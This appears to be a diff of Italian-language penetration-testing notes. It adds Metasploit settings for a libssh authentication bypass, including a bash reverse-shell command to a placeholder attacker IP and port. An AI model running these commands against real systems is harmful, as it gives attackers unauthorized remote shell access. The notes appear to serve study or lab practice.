@@ -936,6 +936,9 @@ uname -r //per mostrare la versione del kernel
 
 ```
 search libssh_auth_bypass
+set RHOSTS <TARGETIP>
+set SPAWN_PTY true //per ottenere una shell
+//oppure: set CMD bash -i >& /dev/tcp/ATTACKERIP/ATTACKERPORT 0>&1   //per eseguire un comando, in particolare per ottenere una reverse shell
 ```
 
 ### Exploiting SAMBA
